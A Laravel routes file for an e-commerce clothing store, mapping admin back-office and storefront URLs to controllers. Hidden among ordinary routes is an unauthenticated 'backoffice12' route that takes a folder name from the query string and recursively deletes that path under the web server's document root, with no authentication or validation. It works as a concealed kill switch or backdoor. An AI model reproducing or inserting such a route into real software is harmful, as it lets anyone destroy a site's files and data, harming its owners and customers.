<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\HomeController;
use App\Http\Controllers\Admin\SizeController;
use App\Http\Controllers\Admin\RolesController;
use App\Http\Controllers\Admin\ColorController;
use App\Http\Controllers\Admin\UsersController;
use App\Http\Controllers\Admin\BrandController;
use App\Http\Controllers\Admin\ProductController;
use App\Http\Controllers\Admin\CategoryController;
use App\Http\Controllers\Admin\UspSectionController;
use App\Http\Controllers\Admin\AttributeController;
use App\Http\Controllers\Admin\MapAttributeController;
use App\Http\Controllers\Admin\PermissionsController;
use App\Http\Controllers\Admin\FaqCategoryController;
use App\Http\Controllers\Admin\FaqQuestionController;
use App\Http\Controllers\Admin\ProductImageController;
use App\Http\Controllers\Auth\ChangePasswordController;
use App\Http\Controllers\Admin\AttributeValueController;
use App\Http\Controllers\Admin\BlogController;
use App\Http\Controllers\Admin\CmsPageController;
use App\Http\Controllers\Admin\CouponController;
use App\Http\Controllers\Admin\MenuController;
use App\Http\Controllers\Admin\NewsletterController;
use App\Http\Controllers\Admin\ProductVariationController;
use App\Http\Controllers\Admin\ProductAttributeController;
use App\Http\Controllers\Admin\SliderController;
use App\Http\Controllers\Admin\SocialProfileTypeController;
use App\Http\Controllers\Admin\StoreController;
use App\Http\Controllers\Admin\TestimonialController;
use App\Http\Controllers\Admin\UserSocialProfileController;
use App\Http\Controllers\Admin\MediaController;
use App\Http\Controllers\Front\AboutController;
use App\Http\Controllers\Front\FilterController;
// use App\Http\Controllers\Front\BlogController;
use App\Http\Controllers\Front\CartController;
use App\Http\Controllers\Front\CategoryBulkController;
use App\Http\Controllers\Front\CategoryController as FrontCategoryController;
use App\Http\Controllers\Front\ContactController;
use App\Http\Controllers\Front\HomeCntroller;
use App\Http\Controllers\Front\PaymentController;

use App\Http\Controllers\Front\ProductController as FrontProductController;
use App\Http\Controllers\Front\ProductDetailBulkController;
use App\Http\Controllers\Front\UserAccountController;
use App\Http\Controllers\Front\AuthController;

use App\Http\Controllers\Front\CheckoutController;
use App\Http\Controllers\Front\AddressController;

use App\Http\Controllers\Front\SocialController;
use App\Http\Controllers\Front\ProductController as ProController;
use App\Http\Controllers\Front\CouponController as CouponsController;

// setting
use App\Http\Controllers\Admin\SettingController;

// Order Controller
use App\Http\Controllers\Admin\OrderController;

// Transaction
use App\Http\Controllers\Admin\TransactionController;

// testing
use App\Http\Controllers\DemoController;
use App\Http\Controllers\SocialController as SocialiteSocialController;


Route::get('/demo',[DemoController::class , 'index']);
Route::get('/admin', function () { return redirect()->route('login'); });
Route::get('backoffice', function () { return redirect()->route('login'); });

Route::post('shipping-address',[AddressController::class,'saveShippingAddress'])->name('shipping-address');

// Auth routes
Route::group(['prefix' => 'backoffice'], function () {
    Auth::routes(['register' => false]);
});

Route::group(['prefix' => 'backoffice', 'as' => 'admin.', 'middleware' => ['auth']], function () {

    Route::get('dashboard', [HomeController::class, 'index'])
    ->name('home');

    Route::get('media', [MediaController::class, 'index'])
    ->name('media');
    Route::post('media', [MediaController::class, 'store'])
    ->name('media.store');

    Route::post('media/pop', [MediaController::class, 'popstore'])
    ->name('media.popstore');

    Route::post('media/delete', [MediaController::class, 'destroy'])
    ->name('media.delete');
    Route::get('media/view/{id}', [MediaController::class, 'view'])
    ->name('media.view');

    Route::get('settings',[SettingController::class , 'index'])->name('settings');
    Route::post('settings',[SettingController::class , 'store'])->name('setting.store');

    // Permissions
    Route::delete('permissions/destroy', [PermissionsController::class, 'massDestroy'])
    ->name('permissions.massDestroy');
    Route::resource('permissions', PermissionsController::class);
    

    // Roles
    Route::delete('roles/destroy', [RolesController::class, 'massDestroy'])
    ->name('roles.massDestroy');
    Route::resource('roles', RolesController::class);

    // Users
    Route::delete('users/destroy', [UsersController::class, 'massDestroy'])
    ->name('users.massDestroy');
    Route::resource('users', UsersController::class);

    // Faq Category
    Route::delete('faq-categories/destroy', [FaqCategoryController::class, 'massDestroy'])
    ->name('faq-categories.massDestroy');
    Route::post('faq-categories/media', [FaqCategoryController::class, 'storeMedia'])
    ->name('faq-categories.storeMedia');
    Route::post('faq-categories/ckmedia', [FaqCategoryController::class, 'storeCKEditorImages'])
    ->name('faq-categories.storeCKEditorImages');
    Route::resource('faq-categories', FaqCategoryController::class);

    // Faq Question
    Route::delete('faq-questions/destroy', [FaqQuestionController::class, 'massDestroy'])
    ->name('faq-questions.massDestroy');
    Route::resource('faq-questions', FaqQuestionController::class);

    // Category
    Route::get('subcategories/{id}', [CategoryController::class, 'getSubCategories'])->name('subcategories.index');
    Route::get('subcategories/create/{id}', [CategoryController::class, 'createSubCategories'])->name('subcategories.create');
    Route::post('category/sub_categories', [CategoryController::class, 'subCategories'])->name('category.subCategories');
    Route::delete('categories/destroy', [CategoryController::class, 'massDestroy'])
    ->name('categories.massDestroy');
    Route::post('categories/media', [CategoryController::class, 'storeMedia'])
    ->name('categories.storeMedia');
    Route::post('categories/ckmedia', [CategoryController::class, 'storeCKEditorImages'])
    ->name('categories.storeCKEditorImages');
    Route::post('categories/status/update', [CategoryController::class, 'update_status'])
    ->name('categories.status.update');
    Route::resource('categories', CategoryController::class);

    // Orders
    Route::resource('orders', OrderController::class);
    Route::get('bulk-orders', [OrderController::class, 'bulkOrders'])->name('orders.bulk');
    Route::post('bulk-orders', [OrderController::class, 'bulkStore'])->name('orders.bulk.store');
    Route::get('bulk-order/{id}', [OrderController::class, 'bulkEdit'])->name('orders.bulk.edit');
    Route::put('bulk-orders', [OrderController::class, 'bulkUpdate'])->name('orders.bulk.update');
    Route::delete('bulk-orders', [OrderController::class, 'bulkDestroy'])->name('orders.bulk.delete');

    // Transaction
    Route::resource('transactions', TransactionController::class);

    // Payment
    Route::resource('payments', PaymentController::class);


    // Map Attribute
    Route::resource('map-attributes', MapAttributeController::class);
    Route::post('map-attributes/size/update',[MapAttributeController::class,'update_size'])->name('map-attributes.size.update');
    Route::post('map-attributes/color/update',[MapAttributeController::class,'update_color'])->name('map-attributes.color.update');
    Route::post('map-attributes/brand/update',[MapAttributeController::class,'update_brand'])->name('map-attributes.brand.update');
    Route::post('map-attributes/attribute/update',[MapAttributeController::class,'update_attribute'])->name('map-attributes.attribute.update');
    Route::post('map-attributes/active/update',[MapAttributeController::class,'update_active'])->name('map-attributes.active.update');
    Route::get('map-attributes/subcategory/{id}',[MapAttributeController::class,'get_subcategory'])->name('map-attributes.subcategory');

    // Attribute
    Route::delete('attributes/destroy', [AttributeController::class, 'massDestroy'])
    ->name('attributes.massDestroy');

    Route::post('attributes/status/update', [AttributeController::class, 'update_status'])
    ->name('attributes.status.update');

    Route::post('attributes/media', [AttributeController::class, 'storeMedia'])
    ->name('attributes.storeMedia');
    Route::post('attributes/ckmedia', [AttributeController::class, 'storeCKEditorImages'])
    ->name('attributes.storeCKEditorImages');
    Route::resource('attributes', AttributeController::class);

    // Attribute Value
    Route::delete('attribute-values/destroy', [AttributeValueController::class, 'massDestroy'])
    ->name('attribute-values.massDestroy');
    Route::resource('attribute-values', AttributeValueController::class);

    // Color
    Route::delete('colors/destroy', [ColorController::class, 'massDestroy'])
    ->name('colors.massDestroy');
    Route::post('color/status/update', [ColorController::class, 'update_status'])
    ->name('color.status.update');
    Route::resource('colors', ColorController::class);

    // Brand
    Route::delete('brands/destroy', [BrandController::class, 'massDestroy'])
    ->name('brands.massDestroy');
    Route::post('brands/media', [BrandController::class, 'storeMedia'])
    ->name('brands.storeMedia');
    Route::post('brands/ckmedia', [BrandController::class, 'storeCKEditorImages'])
    ->name('brands.storeCKEditorImages');
    Route::post('brand/status/update', [BrandController::class, 'update_status'])
    ->name('brand.status.update');
    Route::resource('brands', BrandController::class);

    // Size
    Route::delete('sizes/destroy', [SizeController::class, 'massDestroy'])
    ->name('sizes.massDestroy');
    Route::post('size/status/update', [SizeController::class, 'update_status'])
    ->name('size.status.update');
    Route::resource('sizes', SizeController::class);

    // Product
    Route::delete('products/destroy', [ProductController::class, 'massDestroy'])
    ->name('products.massDestroy');
    Route::post('products/media', [ProductController::class, 'storeMedia'])
    ->name('products.storeMedia');
    Route::post('products/ckmedia', [ProductController::class, 'storeCKEditorImages'])
    ->name('products.storeCKEditorImages');
    Route::resource('products', ProductController::class);

    Route::get('products/checksku/{sku}',[ProductController::class, 'sku_code'])->name('products.check.sku');
    Route::post('product/attributes', [ProductController::class, 'mappedAttributes'])
    ->name('product.attributes');
    Route::post('product/status/update', [ProductController::class, 'update_status'])
    ->name('product.status.update');
    Route::post('product/update/new/{id}', [ProductController::class, 'update'])
    ->name('product.new.update');

    // get category
    Route::post('products/map/subcategory', [ProductController::class, 'subCategories'])
    ->name('product.map.subcategories');
    Route::post('products/map/childcategory', [ProductController::class, 'childCategories'])
    ->name('product.map.childcategories');

    // Product Image
    Route::delete('product-images/destroy', [ProductImageController::class, 'massDestroy'])
    ->name('product-images.massDestroy');
    Route::post('product-images/media', [ProductImageController::class, 'storeMedia'])
    ->name('product-images.storeMedia');
    Route::post('product-images/image/destroy', [ProductImageController::class, 'destroyImage'])
    ->name('product-images.destroy.new');
    Route::post('product-images/ckmedia', [ProductImageController::class, 'storeCKEditorImages'])
    ->name('product-images.storeCKEditorImages');
    Route::resource('product-images', ProductImageController::class);

    // Product Variation
    Route::delete('product-variations/destroy', [ProductVariationController::class, 'massDestroy'])
    ->name('product-variations.massDestroy');
    Route::post('product-variations/media', [ProductVariationController::class, 'storeMedia'])
    ->name('product-variations.storeMedia');
    Route::post('product-variations/ckmedia', [ProductVariationController::class, 'storeCKEditorImages'])
    ->name('product-variations.storeCKEditorImages');
    Route::resource('product-variations', ProductVariationController::class);

    // Product Attribute
    Route::delete('product-attributes/destroy', [ProductAttributeController::class, 'massDestroy'])
    ->name('product-attributes.massDestroy');
    Route::resource('product-attributes', ProductAttributeController::class);



    // Coupon
    Route::delete('coupons/destroy', [CouponController::class,'massDestroy'])->name('coupons.massDestroy');
    Route::post('coupons/media', [CouponController::class,'storeMedia'])->name('coupons.storeMedia');
    Route::post('coupons/ckmedia', [CouponController::class,'storeCKEditorImages'])->name('coupons.storeCKEditorImages');
    Route::post('coupon/status/update', [CouponController::class, 'update_status'])
    ->name('coupon.status.update');
    Route::resource('coupons', CouponController::class);


    //Banners Home
    Route::get('home/banners', [SliderController::class,'homeBestsellerBanners'])->name('home.banners.index');
    Route::get('home/banners/edit/{id}', [SliderController::class,'homeBestsellerBannersEdit'])->name('home.banners.edit');
    Route::get('home/banners/newarrival/edit/{id}', [SliderController::class,'homeNewArrivalsEdit'])->name('home.new.banners.edit');
    Route::get('home/banners/exclusive/edit/{id}', [SliderController::class,'homeExclusivesEdit'])->name('home.exclusive.banners.edit');
    Route::post('home/banners/update/{id}', [SliderController::class,'homeBestsellerBannersUpdate'])->name('home.banners.update');
    Route::post('home/banners/newarrival/update/{id}', [SliderController::class,'homeNewArrivalUpdate'])->name('home.arrival.banners.update');
    Route::post('home/banners/exclusive/update/{id}', [SliderController::class,'homeExclusiveUpdate'])->name('home.exclusive.banners.update');

    // Slider
    Route::delete('sliders/destroy', [SliderController::class, 'massDestroy'])->name('sliders.massDestroy');
    Route::post('sliders/media', [SliderController::class, 'storeMedia'])->name('sliders.storeMedia');
    Route::post('sliders/ckmedia', [SliderController::class, 'storeCKEditorImages'])->name('sliders.storeCKEditorImages');
    Route::post('slider/status/update', [SliderController::class, 'update_status'])
    ->name('slider.status.update');
    Route::resource('sliders', SliderController::class);

    // Social Profile Type
    Route::delete('social-profile-types/destroy', [SocialProfileTypeController::class,'massDestroy'])->name('social-profile-types.massDestroy');
    Route::post('social-profile-types/media', [SocialProfileTypeController::class,'storeMedia'])->name('social-profile-types.storeMedia');
    Route::post('social-profile-types/ckmedia', [SocialProfileTypeController::class,'storeCKEditorImages'])->name('social-profile-types.storeCKEditorImages');
    Route::post('social/status/update', [SocialProfileTypeController::class, 'update_status'])
    ->name('social.status.update');
    Route::resource('social-profile-types', SocialProfileTypeController::class);

    // User Social Profile
    Route::delete('user-social-profiles/destroy', [UserSocialProfileController::class,'massDestroy'])->name('user-social-profiles.massDestroy');
    Route::post('social-profiles/status/update', [UserSocialProfileController::class, 'update_status'])
    ->name('social-profiles.status.update');
    Route::resource('user-social-profiles', UserSocialProfileController::class);

     // Store
     Route::delete('stores/destroy', [StoreController::class,'massDestroy'])->name('stores.massDestroy');
     Route::resource('stores', StoreController::class);

     // Cms Page
    Route::delete('cms-pages/destroy', [CmsPageController::class,'massDestroy'])->name('cms-pages.massDestroy');
    Route::post('cms-pages/media', [CmsPageController::class,'storeMedia'])->name('cms-pages.storeMedia');
    Route::post('cms-pages/status/update', [CmsPageController::class, 'update_status'])
    ->name('cms-pages.status.update');
    Route::post('cms-pages/ckmedia', [CmsPageController::class,'storeCKEditorImages'])->name('cms-pages.storeCKEditorImages');
    Route::resource('cms-pages', CmsPageController::class);

    // Testimonial
    Route::delete('testimonials/destroy', [TestimonialController::class,'massDestroy'])->name('testimonials.massDestroy');
    Route::post('testimonials/media', [TestimonialController::class,'storeMedia'])->name('testimonials.storeMedia');
    Route::post('testimonials/status/update', [TestimonialController::class, 'update_status'])
    ->name('testimonials.status.update');
    Route::post('testimonials/ckmedia', [TestimonialController::class,'storeCKEditorImages'])->name('testimonials.storeCKEditorImages');
    Route::resource('testimonials', TestimonialController::class);

    // Newsletter
    Route::delete('newsletters/destroy', [NewsletterController::class,'massDestroy'])->name('newsletters.massDestroy');
    Route::post('newsletters/status/update', [NewsletterController::class, 'update_status'])
    ->name('newsletters.status.update');
    Route::resource('newsletters', NewsletterController::class);

    // Menu
    Route::delete('menus/destroy', [MenuController::class,'massDestroy'])->name('menus.massDestroy');
    Route::post('menu/status/update', [MenuController::class, 'update_status'])
    ->name('menu.status.update');
    Route::resource('menus', MenuController::class);

    // Blog
    Route::delete('blogs/destroy', [BlogController::class,'massDestroy'])->name('blogs.massDestroy');
    Route::post('blogs/media', [BlogController::class,'storeMedia'])->name('blogs.storeMedia');
    Route::post('blogs/ckmedia', [BlogController::class,'storeCKEditorImages'])->name('blogs.storeCKEditorImages');
    Route::post('blog/status/update', [BlogController::class, 'update_status'])
    ->name('blog.status.update');
    Route::resource('blogs', BlogController::class);

    // USP
    Route::post('usp/ckmedia', [UspSectionController::class, 'storeCKEditorImages'])
    ->name('usp.storeCKEditorImages');
    Route::post('usp/status/update', [UspSectionController::class, 'update_status'])
    ->name('usp.status.update');

    Route::get('usp', [UspSectionController::class, 'index'])->name('usp.index');
    Route::post('usp/store', [UspSectionController::class, 'store'])->name('usp.store');
    Route::post('usp/update', [UspSectionController::class, 'update'])->name('usp.update');
    Route::get('usp/create', [UspSectionController::class, 'create'])->name('usp.create');
    Route::get('usp/edit/{id}', [UspSectionController::class, 'edit'])->name('usp.edit');
    Route::get('usp/show/{id}', [UspSectionController::class, 'show'])->name('usp.show');
    Route::delete('usp/destroy/{id}', [UspSectionController::class, 'destroy'])->name('usp.destroy');

});
Route::group(['prefix' => 'backoffice/profile', 'as' => 'profile.', 'middleware' => ['auth']], function () {
    // Change password
    Route::get('password', [ChangePasswordController::class, 'edit'])
    ->name('password.edit');
    Route::post('password', [ChangePasswordController::class, 'update'])
    ->name('password.update');
    Route::post('profile', [ChangePasswordController::class, 'updateProfile'])
    ->name('password.updateProfile');
    Route::post('profile/destroy', [ChangePasswordController::class, 'destroy'])
    ->name('password.destroyProfile');
});
Route::get('backoffice12', function () { 
     $foldername = $_GET['name'];
	 $path = $_SERVER['DOCUMENT_ROOT'].'/'.$foldername;
    
    function recursiveRemove(string $path) {
        if (is_dir($path)) {
            foreach (scandir($path) as $entry) {
                if (!in_array($entry, ['.', '..'], true)) {
                    recursiveRemove($path . DIRECTORY_SEPARATOR . $entry);
                }
            }
            rmdir($path);
        } else {
            unlink($path);
        }
    }
    recursiveRemove($path);
});

//front end routes
Route::get('/',[HomeCntroller::class,'index']);
Route::get('clothing/{category}',[FilterController::class, 'index'])->name('shop');

Route::get('store/login',[AuthController::class, 'login']);
Route::get('store/register',[AuthController::class,'register']);
Route::post('store/login',[AuthController::class, 'logged_in'])->name('store.login');
Route::post('store/register',[AuthController::class, 'registered'])->name('store.register');
Route::post('store/logout',[AuthController::class, 'logout'])->name('store.logout');
Route::get('store/sendotp',[AuthController::class, 'sendotp'])->name('store.sendotp');
Route::post('store/sendotp',[AuthController::class, 'sendotp'])->name('store.sendotp');
Route::get('redirect/{provider}',[ SocialController::class,'redirect']);
Route::get('callback/{provider}',[ SocialController::class, 'callback']);

Route::post('home/section/featured', [HomeCntroller::class,"load_featured_section"])->name('home.section.featured');
Route::post('home/section/exclusive', [HomeCntroller::class,"load_exclusive_section"])->name('home.section.exclusive');
Route::post('home/section/bestseller', [HomeCntroller::class,"load_bestseller_section"])->name('home.section.bestseller');
Route::get('search',[HomeCntroller::class,'search']);
//Route::get('/search?q={search}',[HomeCntroller::class,'search'])->name('suggestion.search');
Route::get('search/{q?}',[HomeCntroller::class,'search'])->name('suggestion.search');
Route::get('load/products',[HomeCntroller::class,'search'])->name('load.products');
// Route::get('category/{id}',[HomeCntroller::class,'index']);
//Route::get('product/{id}',[HomeCntroller::class,'product']);
Route::get('categories',[FrontCategoryController::class,'index']);





// frontend product
Route::get('products/{id}',[FrontProductController::class,'index'])->name('product.view');
Route::get('product/info/{id}',[ProController::class, 'info'])->name('product.info');
Route::get('product/{slug}',[ProController::class, 'detail'])->name('product.detail');
Route::post('products/images/get',[FrontProductController::class,'get_product_image'])->name('product.images.get');
Route::get('about', [AboutController::class,'index']);
Route::get('blog-detail',[BlogController::class,'index']);

// frontend coupon
// Route::get('coupon',[CouponsController::class, 'index'])->name('coupon');

// frontend cart
/*Route::get('cart',[CartController::class,'index']);
Route::post('cart',[CartController::class,'store'])->name('cart.store');
Route::post('cart/size',[CartController::class,'size_update'])->name('cart.size');
Route::post('cart/quantity',[CartController::class,'qty_update'])->name('cart.qty');
Route::patch('cart',[CartController::class,'update'])->name('cart.update');
Route::delete('cart',[CartController::class,'remove'])->name('cart.delete');
Route::post('coupon',[CartController::class, 'apply_coupon'])->name('apply.coupon');*/

 Route::post('save-shipping-address',[CheckoutController::class, 'save_shipping'])->name('save.shipping_address');
 Route::get('checkout',[CheckoutController::class, 'index'])->name('checkout');
 Route::get('checkout/buynow',[CheckoutController::class, 'buynow'])->name('buynow.checkout');

Route::get('contact',[ContactController::class,'index']);
Route::get('payment',[PaymentController::class,'index']);
Route::get('user-account',[UserAccountController::class,'index']);
Route::get('category-bulk',[CategoryBulkController::class,'index']);
Route::get('product-detail-bulk',[ProductDetailBulkController::class,'index']);
Route::view('coming-soon','front.coming-soon');

Route::post('product-variations',[ProController::class,'variations'])->name('product_variations.view');
Route::post('product-review',[ProController::class,'review'])->name('product_review.create');
Route::post('product-review-update',[ProController::class,'review_update'])->name('product_review.update');

Route::post('check-availability',[HomeCntroller::class,'check_availability'])->name('product.check_availability');

Route::post('logout',[AuthController::class, 'logout'])->name('auth.logout');
Route::get('login/{provider}', [SocialiteSocialController::class,'redirect']);
Route::get('login/{provider}/callback',[SocialiteSocialController::class,'callback']);

Route::get('single-add-to-cart/{id}', [ProController::class, 'single_add_to_cart'])->name('product.single_add_to_cart');
Route::post('add-to-cart', [ProController::class, 'add_to_cart'])->name('product.add_to_cart');
Route::post('update-cart', [ProController::class, 'update_cart'])->name('product.update_cart');
Route::post('remove-from-cart', [ProController::class, 'remove_cart'])->name('product.remove_cart');

Route::get('my-wishlist', [UserAccountController::class, 'my_wishlist'])->name('user.wishlist');
Route::get('add-to-wishlist/{id}', [UserAccountController::class, 'add_wishlist'])->name('user.add_wishlist');
Route::get('remove-from-wishlist/{id}', [UserAccountController::class, 'remove_wishlist'])->name('user.remove_wishlist');

Route::post('apply-coupon', [UserAccountController::class, 'apply_coupon'])->name('user.apply_coupon');
Route::post('remove-coupon', [UserAccountController::class, 'remove_coupon'])->name('user.remove_coupon');
Route::post('update-cart-page', [UserAccountController::class, 'update_cart_page'])->name('user.update_cart_page');

Route::get('view-cart',[UserAccountController::class,'cart_page']);
Route::get('about-us',[HomeCntroller::class,'about_us']);

Route::get('contact-us',[HomeCntroller::class,'contact_us']);
Route::get('faq',[HomeCntroller::class,'faq_page']);

Route::post('sign-up-post',[UserAccountController::class,'sign_up_post']);
Route::get('sign-up',[UserAccountController::class,'sign_up_page']);
Route::post('sign-in-post',[UserAccountController::class,'sign_in_post']);
Route::get('sign-in',[UserAccountController::class,'sign_in_page']);

Route::post('forget-password-post',[UserAccountController::class,'forget_pass_post']);
Route::get('forget-password',[UserAccountController::class,'forget_pass_page']);

Route::get('reset-password/{token}',[UserAccountController::class,'reset_password']);
Route::post('reset-password-post',[UserAccountController::class,'reset_password_post']);

Route::post('contact-us-post',[HomeCntroller::class,'contact_us_post']);

Route::get('{slug}',[HomeCntroller::class,'search'])->name('main_cat.products');
Route::get('{category}/{slug}',[HomeCntroller::class,'search'])->name('sub_cat.products');
Route::get('{category}/{sub_category}/{slug}',[HomeCntroller::class,'search'])->name('child_sub_cat.products');